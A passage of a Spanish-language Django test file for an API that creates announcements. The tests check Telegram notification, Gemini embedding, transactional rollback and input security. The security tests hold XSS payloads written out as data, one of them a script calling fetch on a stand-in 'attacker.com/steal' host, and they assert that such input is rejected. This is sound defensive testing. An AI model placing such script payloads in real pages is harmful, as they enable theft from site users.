        self.assertLessEqual(len(caption_enviada), 1024, "La leyenda excede el límite físico de Telegram.")

        self.assertLess(len(caption_enviada), 1500)
        self.assertIn("BBBB...", caption_enviada)

        mock_generar_embedding.assert_called_once()



    @override_settings(TELEGRAM_BOT_TOKEN='token_falso_de_test_123')
    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    @patch('requests.post')
    def test_post_comunicado_multiples_areas_envia_a_varios_canales_telegram(self, mock_requests_post, mock_generar_embedding):
        """
        Test: Casos de prueba - Integración con Telegram

        Given: Un comunicado asociado a tres áreas distintas, cada una con su propio canal de Telegram.
        When: Se realiza la petición POST.
        Then: El sistema debe realizar una llamada a la API de Telegram por cada canal único configurado.
        """
        self.usuario.esAdmin = True
        self.usuario.save()

        self.area_juventud.telegram_channel_id = "@canal_juventud"
        self.area_juventud.save()

        area_2 = AreaInteres.objects.create(
            nombre_area="Área Secundaria", 
            telegram_channel_id="@canal_2"
        )
        area_3 = AreaInteres.objects.create(
            nombre_area="Área Terciaria", 
            telegram_channel_id="@canal_3"
        )

        payload = {
            "titulo": "Circular Multicanal",
            "contenido": "Este mensaje llegará a tres canales diferentes.",
            "tipo_comunicacion": "GENERAL",
            "areas_interes": [self.area_juventud.id, area_2.id, area_3.id]
        }

        response = self.client.post(self.url, data=payload, format='json')

        self.assertEqual(response.status_code, status.HTTP_201_CREATED)

        self.assertEqual(mock_requests_post.call_count, 3, f"Se esperaban 3 llamadas, se hicieron {mock_requests_post.call_count}")

        canales_detectados = []
        for call in mock_requests_post.mock_calls:
            kwargs = call.kwargs
            if 'data' in kwargs and 'chat_id' in kwargs['data']:
                canales_detectados.append(kwargs['data']['chat_id'])
        
        self.assertIn("@canal_juventud", canales_detectados)
        self.assertIn("@canal_2", canales_detectados)
        self.assertIn("@canal_3", canales_detectados)

        mock_generar_embedding.assert_called_once()



    @override_settings(TELEGRAM_BOT_TOKEN='token_falso_de_test_123')
    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    @patch('requests.post')
    def test_post_comunicado_si_telegram_falla_comunicado_se_crea_igualmente(self, mock_requests_post, mock_generar_embedding):
        """
        Test: Casos de prueba - Integración con Telegram

        Given: Un usuario que crea un comunicado pero la API de Telegram no está disponible (Error 500).
        When: Se realiza la petición POST.
        Then: El comunicado debe crearse exitosamente en la base de datos (HTTP 201) a pesar del fallo en la notificación.
        """
        self.usuario.esAdmin = True
        self.usuario.save()

        self.area_juventud.telegram_channel_id = "@canal_problemas"
        self.area_juventud.save()

        mock_requests_post.side_effect = Exception("Telegram API is down")

        payload = {
            "titulo": "Comunicado Resiliente",
            "contenido": "Este comunicado debe guardarse aunque Telegram falle.",
            "tipo_comunicacion": "GENERAL",
            "areas_interes": [self.area_juventud.id]
        }

        response = self.client.post(self.url, data=payload, format='json')

        self.assertEqual(response.status_code, status.HTTP_201_CREATED)

        from api.models import Comunicado
        self.assertTrue(Comunicado.objects.filter(titulo="Comunicado Resiliente").exists())

        mock_generar_embedding.assert_called_once()

        self.assertTrue(mock_requests_post.called)



    @override_settings(TELEGRAM_BOT_TOKEN='token_falso_de_test_123')
    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    @patch('requests.post')
    def test_post_comunicado_si_telegram_da_timeout_comunicado_se_crea_igualmente(self, mock_requests_post, mock_generar_embedding):
        """
        Test: Casos de prueba - Integración con Telegram

        Given: Un intento de envío a Telegram donde el servidor externo no responde a tiempo.
        When: Se realiza la petición POST y requests lanza una excepción de Timeout.
        Then: El sistema captura el error y permite que el comunicado se cree normalmente.
        """
        self.usuario.esAdmin = True
        self.usuario.save()

        self.area_juventud.telegram_channel_id = "@canal_lento"
        self.area_juventud.save()

        mock_requests_post.side_effect = requests.exceptions.Timeout("El servidor de Telegram no respondió.")

        payload = {
            "titulo": "Comunicado con Red Lenta",
            "contenido": "Validando la gestión de timeouts de red.",
            "tipo_comunicacion": "GENERAL",
            "areas_interes": [self.area_juventud.id]
        }

        response = self.client.post(self.url, data=payload, format='json')

        self.assertEqual(response.status_code, status.HTTP_201_CREATED)

        self.assertTrue(Comunicado.objects.filter(titulo="Comunicado con Red Lenta").exists())

        self.assertEqual(mock_requests_post.call_args.kwargs.get('timeout'), 5)

        mock_generar_embedding.assert_called_once()



    @override_settings(TELEGRAM_BOT_TOKEN='token_falso_de_test_123')
    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    @patch('requests.post')
    def test_post_comunicado_si_canal_telegram_es_invalido_comunicado_se_crea_igualmente(self, mock_requests_post, mock_generar_embedding):
        """
        Test: Casos de prueba - Integración con Telegram

        Given: Un área con un telegram_channel_id que no existe o es inválido.
        When: Se realiza la petición POST y Telegram responde con un error 400 (Bad Request).
        Then: El sistema debe ignorar el error de Telegram y completar la creación del comunicado.
        """
        self.usuario.esAdmin = True
        self.usuario.save()

        self.area_juventud.telegram_channel_id = "canal_que_no_existe_123"
        self.area_juventud.save()

        mock_response = MagicMock()
        mock_response.status_code = 400
        mock_response.json.return_value = {"ok": False, "description": "Bad Request: chat not found"}
        mock_requests_post.return_value = mock_response

        payload = {
            "titulo": "Comunicado Canal Inválido",
            "contenido": "Validando que un ID de canal erróneo no rompa el flujo.",
            "tipo_comunicacion": "GENERAL",
            "areas_interes": [self.area_juventud.id]
        }

        response = self.client.post(self.url, data=payload, format='json')

        self.assertEqual(response.status_code, status.HTTP_201_CREATED)

        self.assertTrue(Comunicado.objects.filter(titulo="Comunicado Canal Inválido").exists())

        self.assertTrue(mock_requests_post.called)

        mock_generar_embedding.assert_called_once()



    @override_settings(TELEGRAM_BOT_TOKEN='token_falso_de_test_123')
    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    @patch('requests.post')
    def test_post_comunicado_si_hay_error_conexion_telegram_comunicado_se_crea_igualmente(self, mock_requests_post, mock_generar_embedding):
        """
        Test: Casos de prueba - Integración con Telegram

        Given: Un error de conectividad total a nivel de red (DNS, No Route to Host).
        When: Se realiza la petición POST y la librería requests lanza un ConnectionError.
        Then: El sistema debe capturar la excepción y completar la creación del comunicado.
        """
        self.usuario.esAdmin = True
        self.usuario.save()

        self.area_juventud.telegram_channel_id = "@canal_sin_red"
        self.area_juventud.save()

        mock_requests_post.side_effect = requests.exceptions.ConnectionError("Failed to establish a new connection")

        payload = {
            "titulo": "Comunicado sin Conexión",
            "contenido": "Validando resiliencia ante fallo total de red.",
            "tipo_comunicacion": "GENERAL",
            "areas_interes": [self.area_juventud.id]
        }

        response = self.client.post(self.url, data=payload, format='json')

        self.assertEqual(response.status_code, status.HTTP_201_CREATED)

        self.assertTrue(Comunicado.objects.filter(titulo="Comunicado sin Conexión").exists())

        mock_generar_embedding.assert_called_once()



    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    @patch('requests.post')
    def test_post_comunicado_con_imagen_corrupta_devuelve_error(self, mock_requests_post, mock_generar_embedding):
        """
        Test: Casos de prueba - Validación de archivos

        Given: Un usuario que intenta subir un archivo con extensión .png pero con contenido corrupto/inválido.
        When: Se realiza la petición POST (multipart).
        Then: El sistema debe devolver un error 400 y no debe intentar notificar a Telegram ni generar embeddings.
        """
        self.usuario.esAdmin = True
        self.usuario.save()

        bytes_corruptos = b'esto_no_es_una_imagen_real_aunque_tenga_extension_png'
        
        imagen_invalida = SimpleUploadedFile(
            name='corrupta.png',
            content=bytes_corruptos,
            content_type='image/png'
        )

        payload = {
            "titulo": "Intento de imagen corrupta",
            "contenido": "Probando la robustez del validador de imágenes.",
            "tipo_comunicacion": "GENERAL",
            "areas_interes": [self.area_juventud.id], 
            "imagen_portada": imagen_invalida
        }

        response = self.client.post(self.url, data=payload, format='multipart')

        self.assertEqual(response.status_code, status.HTTP_400_BAD_REQUEST)

        self.assertIn('imagen_portada', response.data)

        mock_requests_post.assert_not_called()
        mock_generar_embedding.assert_not_called()



    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    @patch('requests.post')
    def test_post_comunicado_exitoso_dispara_generacion_de_embedding(self, mock_requests_post, mock_generar_embedding):
        """
        Test: Casos de prueba - Integración con IA

        Given: Un usuario autorizado que crea un comunicado válido.
        When: Se realiza la petición POST y el comunicado se guarda en BD.
        Then: El sistema debe invocar a la tarea asíncrona de generación de embeddings con el ID correcto.
        """
        self.usuario.esAdmin = True
        self.usuario.save()

        payload = {
            "titulo": "Comunicado para Procesamiento IA",
            "contenido": "Contenido que será vectorizado por Gemini.",
            "tipo_comunicacion": "GENERAL",
            "areas_interes": [self.area_juventud.id]
        }

        response = self.client.post(self.url, data=payload, format='json')

        self.assertEqual(response.status_code, status.HTTP_201_CREATED)

        comunicado_id = response.data.get('id')

        mock_generar_embedding.assert_called_once()

        args, _ = mock_generar_embedding.call_args
        self.assertEqual(args[0], comunicado_id, "La tarea de IA debe recibir el ID del comunicado creado.")



    @patch('api.servicios.comunicado.gemini_service.genai.Client')
    @patch('api.servicios.comunicado.gemini_service.threading.Thread')
    def test_generar_y_guardar_embedding_ejecucion_exitosa(self, mock_thread, mock_genai_client):
        """
        Test: Casos de prueba - Integración con IA

        Given: Un comunicado ya persistido en la base de datos sin embedding.
        When: Se ejecuta la lógica de generación de embedding.
        Then: El campo 'embedding' del comunicado se debe actualizar con el vector recibido de Gemini.
        """
        comunicado = Comunicado.objects.create(
            titulo="Título IA",
            contenido="Contenido para vectorizar",
            autor=self.usuario,
            tipo_comunicacion="GENERAL"
        )

        mock_client_instance = mock_genai_client.return_value
        vector_falso = [0.1, 0.2, 0.3, -0.1, -0.2]

        mock_response = MagicMock()
        mock_embedding = MagicMock()
        mock_embedding.values = vector_falso
        mock_response.embeddings = [mock_embedding]
        
        mock_client_instance.models.embed_content.return_value = mock_response

        generar_y_guardar_embedding_async(comunicado.id)

        func_interna_run = mock_thread.call_args.kwargs['target']
        func_interna_run()

        comunicado.refresh_from_db()
        self.assertEqual(comunicado.embedding, vector_falso, "El embedding en BD debe coincidir con el devuelto por Gemini.")

        mock_client_instance.models.embed_content.assert_called_once()
        _, kwargs = mock_client_instance.models.embed_content.call_args
        self.assertIn("Título: Título IA", kwargs.get('contents'))



    @patch('api.servicios.comunicado.gemini_service.genai.Client')
    @patch('api.servicios.comunicado.gemini_service.threading.Thread')
    def test_generar_y_guardar_embedding_persiste_en_json_correctamente(self, mock_thread, mock_genai_client):
        """
        Test: Casos de prueba - Integración con IA

        Given: Un comunicado cuya respuesta de la IA debe guardarse en un campo JSON.
        When: Se ejecuta la tarea de embedding y se actualiza el modelo.
        Then: El campo 'embedding' debe contener una lista de valores numéricos válida y recuperable.
        """
        comunicado = Comunicado.objects.create(
            titulo="Test JSON",
            contenido="Verificando formato de lista en JSON.",
            autor=self.usuario,
            tipo_comunicacion="GENERAL"
        )

        mock_client_instance = mock_genai_client.return_value
        vector_esperado = [0.123, 0.456, 0.789, -0.001]

        mock_response = MagicMock()
        mock_emb_obj = MagicMock()
        mock_emb_obj.values = vector_esperado
        mock_response.embeddings = [mock_emb_obj]
        
        mock_client_instance.models.embed_content.return_value = mock_response

        generar_y_guardar_embedding_async(comunicado.id)

        func_interna_run = mock_thread.call_args.kwargs['target']
        func_interna_run()

        comunicado.refresh_from_db()

        self.assertIsInstance(comunicado.embedding, list)
        self.assertEqual(len(comunicado.embedding), 4)
        self.assertEqual(comunicado.embedding, vector_esperado)



    @patch('api.servicios.comunicado.gemini_service.genai.Client')
    @patch('api.servicios.comunicado.gemini_service.threading.Thread')
    def test_generar_y_guardar_embedding_error_api_gemini(self, mock_thread, mock_genai_client):
        """
        Test: Casos de prueba - Integración con IA

        Given: Un comunicado guardado pero con un error en la llamada a la API de Gemini.
        When: Se ejecuta la tarea de generación de embedding y la API lanza una excepción.
        Then: El sistema debe capturar el error, no debe actualizar el campo 'embedding' y el flujo debe terminar sin errores fatales.
        """
        comunicado = Comunicado.objects.create(
            titulo="Test Error IA",
            contenido="Este contenido fallará al vectorizarse.",
            autor=self.usuario,
            tipo_comunicacion="GENERAL",
            embedding=None
        )

        mock_client_instance = mock_genai_client.return_value
        mock_client_instance.models.embed_content.side_effect = Exception("API Key expired or quota exceeded")

        generar_y_guardar_embedding_async(comunicado.id)

        func_interna_run = mock_thread.call_args.kwargs['target']

        try:
            func_interna_run()
        except Exception as e:
            self.fail(f"La función _run() lanzó una excepción no controlada: {e}")

        comunicado.refresh_from_db()

        self.assertIsNone(comunicado.embedding, "El embedding no debería haberse actualizado tras un fallo de la API.")

        mock_client_instance.models.embed_content.assert_called_once()



    @patch('api.servicios.comunicado.gemini_service.genai.Client')
    @patch('api.servicios.comunicado.gemini_service.threading.Thread')
    def test_generar_y_guardar_embedding_timeout_api(self, mock_thread, mock_genai_client):
        """
        Test: Casos de prueba - Integración con IA

        Given: Un intento de generación de embedding donde la API de Gemini tarda demasiado en responder.
        When: Se ejecuta la tarea y la llamada a embed_content lanza una excepción de Timeout.
        Then: El sistema debe capturar el error de red, registrar el fallo y finalizar el hilo sin actualizar el comunicado.
        """
        comunicado = Comunicado.objects.create(
            titulo="Test Timeout IA",
            contenido="Este contenido simulará un retraso de red.",
            autor=self.usuario,
            tipo_comunicacion="GENERAL"
        )

        mock_client_instance = mock_genai_client.return_value
        mock_client_instance.models.embed_content.side_effect = Exception("Deadline Exceeded (Timeout)")

        generar_y_guardar_embedding_async(comunicado.id)

        func_interna_run = mock_thread.call_args.kwargs['target']

        try:
            func_interna_run()
        except Exception as e:
            self.fail(f"La lógica de embedding no capturó el Timeout: {e}")

        comunicado.refresh_from_db()

        self.assertIsNone(comunicado.embedding, "El embedding no debería guardarse si hubo un timeout de red.")

        mock_client_instance.models.embed_content.assert_called_once()



    @patch('api.servicios.comunicado.gemini_service.genai.Client')
    @patch('api.servicios.comunicado.gemini_service.threading.Thread')
    def test_generar_y_guardar_embedding_error_inesperado_en_tarea_async(self, mock_thread, mock_genai_client):
        """
        Test: Casos de prueba - Integración con IA

        Given: Un comunicado cuya tarea de procesamiento lanza un error inesperado (ej. fallo de lógica interna).
        When: Se ejecuta la tarea asíncrona y ocurre una excepción general.
        Then: El sistema debe capturar el error en el bloque except, imprimir el fallo y no romper el flujo del servidor.
        """
        comunicado = Comunicado.objects.create(
            titulo="Test Error Interno",
            contenido="Contenido para forzar fallo.",
            autor=self.usuario,
            tipo_comunicacion="GENERAL"
        )

        mock_client_instance = mock_genai_client.return_value
        mock_client_instance.models.embed_content.return_value = None 

        generar_y_guardar_embedding_async(comunicado.id)

        func_interna_run = mock_thread.call_args.kwargs['target']

        try:
            func_interna_run()
        except Exception as e:
            self.fail(f"La tarea async no capturó el error interno: {e}")

        comunicado.refresh_from_db()

        self.assertIsNone(comunicado.embedding, "El embedding no debería guardarse si la tarea falló.")



    @patch('api.servicios.comunicado.gemini_service.genai.Client')
    @patch('api.servicios.comunicado.gemini_service.threading.Thread')
    def test_generar_y_guardar_embedding_devuelve_lista_vacia(self, mock_thread, mock_genai_client):
        """
        Test: Casos de prueba - Integración con IA

        Given: Un comunicado enviado a Gemini cuya respuesta de embeddings es una lista vacía.
        When: Se ejecuta la tarea asíncrona y se intenta acceder a resultado.embeddings[0].
        Then: El sistema debe capturar el IndexError mediante el try/except, registrar el error y finalizar sin actualizar el comunicado.
        """
        comunicado = Comunicado.objects.create(
            titulo="Test Vector Vacío",
            contenido="Contenido que genera respuesta vacía.",
            autor=self.usuario,
            tipo_comunicacion="GENERAL"
        )

        mock_client_instance = mock_genai_client.return_value
        mock_response = MagicMock()
        mock_response.embeddings = []
        
        mock_client_instance.models.embed_content.return_value = mock_response

        generar_y_guardar_embedding_async(comunicado.id)

        func_interna_run = mock_thread.call_args.kwargs['target']

        try:
            func_interna_run()
        except IndexError:
            self.fail("La tarea async no capturó el IndexError internamente.")
        except Exception as e:
            self.fail(f"Ocurrió una excepción no controlada: {e}")

        comunicado.refresh_from_db()

        self.assertIsNone(comunicado.embedding, "El embedding no debe guardarse si la respuesta fue una lista vacía.")



    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    @patch('requests.post')
    def test_post_comunicado_persiste_en_base_de_datos_con_todos_sus_campos(self, mock_requests_post, mock_generar_embedding):
        """
        Test: Casos de prueba - Persistencia y base de datos

        Given: Un payload completo con título, contenido, tipo y áreas de interés.
        When: Se realiza la petición POST exitosamente.
        Then: Se debe verificar que el registro en la base de datos contiene exactamente los mismos datos enviados.
        """
        self.usuario.esAdmin = True
        self.usuario.save()

        area_formacion = AreaInteres.objects.create(nombre_area="Formación")

        payload = {
            "titulo": "Título de Persistencia",
            "contenido": "Contenido verificado en DB.",
            "tipo_comunicacion": "GENERAL",
            "areas_interes": [self.area_juventud.id, area_formacion.id]
        }

        response = self.client.post(self.url, data=payload, format='json')
        self.assertEqual(response.status_code, status.HTTP_201_CREATED)

        comunicado_db = Comunicado.objects.get(id=response.data['id'])

        self.assertEqual(comunicado_db.titulo, payload["titulo"])
        self.assertEqual(comunicado_db.contenido, payload["contenido"])
        self.assertEqual(comunicado_db.tipo_comunicacion, payload["tipo_comunicacion"])

        self.assertEqual(comunicado_db.autor, self.usuario)

        areas_ids = list(comunicado_db.areas_interes.values_list('id', flat=True))
        self.assertIn(self.area_juventud.id, areas_ids)
        self.assertIn(area_formacion.id, areas_ids)
        self.assertEqual(len(areas_ids), 2)

        self.assertIsNotNone(comunicado_db.fecha_emision)



    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    @patch('requests.post')
    def test_post_comunicado_relacion_m2m_areas_interes_se_guarda_correctamente(self, mock_requests_post, mock_generar_embedding):
        """
        Test: Casos de prueba - Persistencia y base de datos

        Given: Un payload que asocia un comunicado con múltiples áreas de interés existentes.
        When: Se realiza la petición POST.
        Then: El sistema debe crear el comunicado y establecer las relaciones en la tabla intermedia M2M correctamente.
        """
        self.usuario.esAdmin = True
        self.usuario.save()

        area_cultos = AreaInteres.objects.create(nombre_area="Cultos")
        area_patrimonio = AreaInteres.objects.create(nombre_area="Patrimonio")

        ids_enviados = [self.area_juventud.id, area_cultos.id, area_patrimonio.id]

        payload = {
            "titulo": "Comunicado Transversal",
            "contenido": "Información relevante para múltiples delegaciones.",
            "tipo_comunicacion": "GENERAL",
            "areas_interes": ids_enviados
        }

        response = self.client.post(self.url, data=payload, format='json')
        self.assertEqual(response.status_code, status.HTTP_201_CREATED)

        comunicado_db = Comunicado.objects.get(id=response.data['id'])

        ids_en_db = list(comunicado_db.areas_interes.values_list('id', flat=True))

        self.assertEqual(len(ids_en_db), 3, "El comunicado debería tener exactamente 3 áreas asociadas.")
        for area_id in ids_enviados:
            self.assertIn(area_id, ids_en_db, f"El área con ID {area_id} no se vinculó correctamente.")

        self.assertTrue(area_cultos.comunicados.filter(id=comunicado_db.id).exists())



    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    @patch('requests.post')
    def test_post_comunicado_autor_fk_se_guarda_correctamente(self, mock_requests_post, mock_generar_embedding):
        """
        Test: Casos de prueba - Persistencia y base de datos

        Given: Un usuario autenticado con permisos de administrador.
        When: Se realiza la petición POST para crear un comunicado.
        Then: El sistema debe asignar automáticamente al usuario de la sesión como el autor del comunicado en la DB.
        """
        self.usuario.esAdmin = True
        self.usuario.save()

        payload = {
            "titulo": "Comunicado con Autor",
            "contenido": "Verificando la relación ForeignKey con el usuario.",
            "tipo_comunicacion": "GENERAL",
            "areas_interes": [self.area_juventud.id]
        }

        response = self.client.post(self.url, data=payload, format='json')
        self.assertEqual(response.status_code, status.HTTP_201_CREATED)

        comunicado_db = Comunicado.objects.get(id=response.data['id'])

        self.assertIsNotNone(comunicado_db.autor, "El campo autor no puede ser nulo.")
        self.assertEqual(comunicado_db.autor.id, self.usuario.id, "El autor guardado debe ser el mismo que realizó la petición.")

        self.assertTrue(
            self.usuario.comunicados_emitidos.filter(id=comunicado_db.id).exists(),
            "El comunicado no es accesible desde la relación inversa del usuario."
        )



    @patch('api.models.Comunicado.objects.create')
    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    @patch('requests.post')
    def test_post_comunicado_error_db_durante_create_no_dispara_acciones_externas(self, mock_requests_post, mock_generar_embedding, mock_create):
        """
        Test: Casos de prueba - Persistencia y base de datos

        Given: Un intento de creación de comunicado donde la base de datos lanza un error de integridad o conexión.
        When: Se realiza la petición POST y el método .create() falla.
        Then: El sistema debe devolver un error 500 o 400, y bajo ningún concepto debe llamar a Telegram ni a la IA.
        """
        self.usuario.esAdmin = True
        self.usuario.save()

        mock_create.side_effect = IntegrityError("Error crítico de base de datos")

        payload = {
            "titulo": "Comunicado Fallido",
            "contenido": "Este comunicado no llegará a la DB.",
            "tipo_comunicacion": "GENERAL",
            "areas_interes": [self.area_juventud.id]
        }

        response = self.client.post(self.url, data=payload, format='json')

        self.assertTrue(status.is_client_error(response.status_code) or status.is_server_error(response.status_code))

        mock_requests_post.assert_not_called()

        mock_generar_embedding.assert_not_called()



    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    @patch('requests.post')
    def test_post_comunicado_error_db_al_asignar_areas_no_dispara_acciones_externas(self, mock_requests_post, mock_generar_embedding):
        """
        Test: Casos de prueba - Persistencia y base de datos

        Given: Un comunicado que se intenta crear.
        When: El guardado del objeto principal funciona, pero la asociación de áreas de interés (M2M) 
            lanza un error de base de datos.
        Then: Debido a la transacción atómica, el comunicado no debe persistirse (Rollback) 
            y no deben ejecutarse llamadas a Telegram ni a la IA.
        """
        self.usuario.esAdmin = True
        self.usuario.save()

        with patch('django.db.models.fields.related_descriptors.ManyToManyDescriptor.__get__') as mock_m2m:
            mock_m2m.side_effect = DatabaseError("Error de integridad en tabla intermedia M2M")

            payload = {
                "titulo": "Comunicado Error M2M",
                "contenido": "Este contenido nunca debería verse en Telegram.",
                "tipo_comunicacion": "GENERAL",
                "areas_interes": [self.area_juventud.id]
            }

            response = self.client.post(self.url, data=payload, format='json')

            self.assertGreaterEqual(response.status_code, 400, 
                f"Se esperaba un error de servidor/cliente, pero se obtuvo {response.status_code}")

            self.assertFalse(Comunicado.objects.filter(titulo="Comunicado Error M2M").exists(),
                "Error de Atomicidad: El comunicado se guardó a pesar de que fallaron sus áreas.")

            mock_requests_post.assert_not_called()
            mock_generar_embedding.assert_not_called()



    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    @patch('requests.post')
    def test_post_comunicado_rollback_total_si_falla_la_transaccion_al_final(self, mock_requests_post, mock_generar_embedding):
        """
        Test: Casos de prueba - Persistencia y base de datos

        Given: Un flujo de creación que falla en el último momento por una excepción inesperada.
        When: El comunicado y las áreas ya se han procesado pero la transacción atómica falla.
        Then: La base de datos debe revertir todos los cambios (Rollback) y no debe quedar rastro del comunicado.
        """
        self.usuario.esAdmin = True
        self.usuario.save()

        mock_generar_embedding.side_effect = Exception("Fallo catastrófico final")

        payload = {
            "titulo": "Comunicado Fantasma",
            "contenido": "Este comunicado debería desaparecer por el rollback.",
            "tipo_comunicacion": "GENERAL",
            "areas_interes": [self.area_juventud.id]
        }

        response = self.client.post(self.url, data=payload, format='json')

        self.assertTrue(
            status.is_client_error(response.status_code) or status.is_server_error(response.status_code),
            f"Se esperaba un código de error, pero se obtuvo {response.status_code}"
        )

        existe_comunicado = Comunicado.objects.filter(titulo="Comunicado Fantasma").exists()
        self.assertFalse(existe_comunicado, "El Rollback falló: el comunicado se persistió a pesar del error.")



    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    @patch('requests.post')
    def test_post_comunicado_no_duplica_notificaciones_ni_ia(self, mock_requests_post, mock_generar_embedding):
        """
        Test: Casos de prueba - Persistencia y base de datos

        Given: Un usuario que envía una petición de creación válida.
        When: El sistema procesa la transacción atómica.
        Then: Las llamadas a servicios externos (Telegram e IA) deben ejecutarse exactamente una vez.
        """
        self.usuario.esAdmin = True
        self.usuario.save()

        self.area_juventud.telegram_channel_id = "@canal_test"
        self.area_juventud.save()

        payload = {
            "titulo": "Comunicado Único",
            "contenido": "Verificando que no hay disparos dobles.",
            "tipo_comunicacion": "GENERAL",
            "areas_interes": [self.area_juventud.id]
        }

        response = self.client.post(self.url, data=payload, format='json')
        self.assertEqual(response.status_code, status.HTTP_201_CREATED)

        self.assertEqual(mock_generar_embedding.call_count, 1, "La IA se disparó más de una vez.")

        self.assertEqual(mock_requests_post.call_count, 1, "Telegram recibió múltiples notificaciones para el mismo evento.")



    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    @patch('requests.post')
    def test_post_comunicado_seguridad_inyeccion_html_script_bloqueado(self, mock_requests_post, mock_generar_embedding):
        """
        Test: Casos de prueba - Seguridad

        Given: Un administrador autenticado intentando enviar contenido malicioso.
        When: El campo 'contenido' incluye etiquetas <script> (intento de XSS).
        Then: El sistema debe rechazar la solicitud con un error 400 (Bad Request),
            impidiendo que el script se guarde o se distribuya a otros servicios.
        """
        self.usuario.esAdmin = True
        self.usuario.save()
        self.client.force_authenticate(user=self.usuario)

        script_malicioso = "<script>alert('Ataque XSS');</script><b>Contenido</b>"
        payload = {
            "titulo": "Aviso Urgente",
            "contenido": script_malicioso,
            "tipo_comunicacion": "GENERAL",
            "areas_interes": [self.area_juventud.id]
        }

        response = self.client.post(self.url, data=payload, format='json')

        self.assertEqual(response.status_code, status.HTTP_400_BAD_REQUEST, 
                        f"Se esperaba 400 por seguridad, pero se obtuvo {response.status_code}. Error: {response.data}")

        self.assertFalse(Comunicado.objects.filter(titulo="Aviso Urgente").exists())

        mock_requests_post.assert_not_called()
        mock_generar_embedding.assert_not_called()



    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    @patch('requests.post')
    def test_post_comunicado_seguridad_script_injection_bloqueado(self, mock_requests_post, mock_generar_embedding):
        """
        Test: Casos de prueba - Seguridad

        Given: Un administrador autenticado que intenta enviar contenido malicioso.
        When: El campo 'contenido' incluye etiquetas <script> con código JavaScript.
        Then: El sistema debe rechazar la petición con un error 400 (Bad Request),
            evitando que el script malicioso se guarde en la base de datos.
        """
        self.usuario.esAdmin = True
        self.usuario.save()
        self.client.force_authenticate(user=self.usuario)

        malicious_script = "<script>fetch('https://attacker.com/steal')</script>"
        payload = {
            "titulo": "Aviso con Trampa",
            "contenido": malicious_script,
            "tipo_comunicacion": "GENERAL",
            "areas_interes": [self.area_juventud.id]
        }

        response = self.client.post(self.url, data=payload, format='json')

        self.assertEqual(response.status_code, status.HTTP_400_BAD_REQUEST)

        self.assertFalse(Comunicado.objects.filter(titulo="Aviso con Trampa").exists())

        mock_requests_post.assert_not_called()
        mock_generar_embedding.assert_not_called()



    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    @patch('requests.post')
    def test_post_comunicado_seguridad_payload_json_malicioso(self, mock_requests_post, mock_generar_embedding):
        """
        Test: Casos de prueba - Seguridad

        Given: Un administrador autenticado que envía un JSON con campos no permitidos o tipos inválidos.
        When: Se incluyen campos inexistentes como 'campo_inexistente_hacker' o estructuras malformadas.
        Then: El sistema debe rechazar la petición con un error 400 (Bad Request) informando 
            que se han detectado campos no permitidos, protegiendo la integridad del modelo.
        """
        self.usuario.esAdmin = True
        self.usuario.save()
        self.client.force_authenticate(user=self.usuario)

        payload_corrupto = {
            "titulo": "Aviso Corrupto",
            "contenido": "Contenido legítimo",
            "tipo_comunicacion": "GENERAL",
            "areas_interes": "ESTO_DEBERIA_SER_UNA_LISTA", 
            "campo_inexistente_hacker": "data_trash",
            "ataque_recursivo": {"a": {"b": {"c": "..."}}}
        }

        response = self.client.post(self.url, data=payload_corrupto, format='json')

        self.assertEqual(response.status_code, status.HTTP_400_BAD_REQUEST)

        self.assertIn('error', response.data)
        self.assertIn('Campos no permitidos detectados', response.data['error'])
        self.assertIn('campo_inexistente_hacker', response.data['error'])

        self.assertEqual(Comunicado.objects.count(), 0)

        mock_requests_post.assert_not_called()
        mock_generar_embedding.assert_not_called()



    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    @patch('requests.post')
    def test_post_comunicado_seguridad_manipulacion_campo_autor(self, mock_requests_post, mock_generar_embedding):
        """
        Test: Casos de prueba - Seguridad

        Given: Un administrador autenticado intentando suplantar la autoría.
        When: Envía un campo 'autor' manualmente en el JSON con el ID de otro usuario.
        Then: El sistema debe ignorar ese campo o rechazar la petición, asegurando 
            que el autor real siempre sea el usuario que realiza la petición.
        """
        self.usuario.esAdmin = True
        self.usuario.save()
        self.client.force_authenticate(user=self.usuario)

        otro_usuario = Hermano.objects.create_user(
            dni="11111111A", username="11111111A", password="password", 
            nombre="Victima", primer_apellido="Ap", segundo_apellido="Ap",
            telefono="699999999", email="v@test.com", estado_civil="SOLTERO"
        )

        payload = {
            "titulo": "Intento de suplantación",
            "contenido": "Cuerpo del mensaje",
            "tipo_comunicacion": "GENERAL",
            "areas_interes": [self.area_juventud.id],
            "autor": otro_usuario.id
        }

        response = self.client.post(self.url, data=payload, format='json')

        if response.status_code == status.HTTP_400_BAD_REQUEST:
            self.assertIn('autor', str(response.data))
            self.assertEqual(Comunicado.objects.count(), 0)

        else:
            self.assertEqual(response.status_code, status.HTTP_201_CREATED)
            comunicado = Comunicado.objects.get(id=response.data['id'])
            self.assertEqual(comunicado.autor, self.usuario)
            self.assertNotEqual(comunicado.autor, otro_usuario)



    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    @patch('requests.post')
    def test_post_comunicado_seguridad_manipulacion_fecha_emision(self, mock_requests_post, mock_generar_embedding):
